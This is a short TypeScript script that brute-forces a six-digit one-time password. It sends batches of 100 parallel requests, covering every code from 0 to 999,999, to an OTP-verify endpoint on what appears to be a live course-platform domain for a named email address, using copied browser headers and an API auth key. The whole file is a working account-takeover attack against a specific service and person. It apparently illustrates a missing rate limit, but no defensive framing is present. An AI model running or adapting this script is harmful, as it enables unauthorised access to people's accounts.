import axios from "axios";

async function sendRequest(otp: number) {
  let config = {
    method: "get",
    maxBodyLength: Infinity,
    url:
      "https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp=" +
      otp,
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "auth-key": "appxapi",
      "client-service": "Appx",
      "device-type": "",
      origin: "https://harkirat.classx.co.in",
      priority: "u=1, i",
      referer: "https://harkirat.classx.co.in/",
      "sec-ch-ua":
        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"macOS"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      source: "website",
      "user-agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    },
  };

  try {
    await axios.request(config);
  } catch (error) {
    console.error(error);
  }
}

async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j));
    }
    await Promise.all(promises);
  }
}

main();
